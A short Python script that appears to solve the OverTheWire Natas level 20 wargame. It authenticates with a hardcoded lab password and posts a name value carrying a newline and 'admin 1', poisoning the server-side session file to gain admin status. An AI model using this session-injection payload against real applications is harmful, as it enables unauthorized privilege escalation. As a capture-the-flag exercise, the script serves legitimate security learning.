import requests

url = "http://natas20.natas.labs.overthewire.org/"
auth = ("natas20", "slOKYGsjlJhaqKliGvrgWAzln0JyrWao")

session = requests.Session()
session.auth = auth

# Step 1: poison the session - name contains a real newline + "admin 1"
payload = {"name": "hacker\nadmin 1"}
r1 = session.post(url, data=payload)

# Step 2: reload with the same session cookie, triggering myread() to re-parse the corrupted file
r2 = session.get(url)
print(r2.text)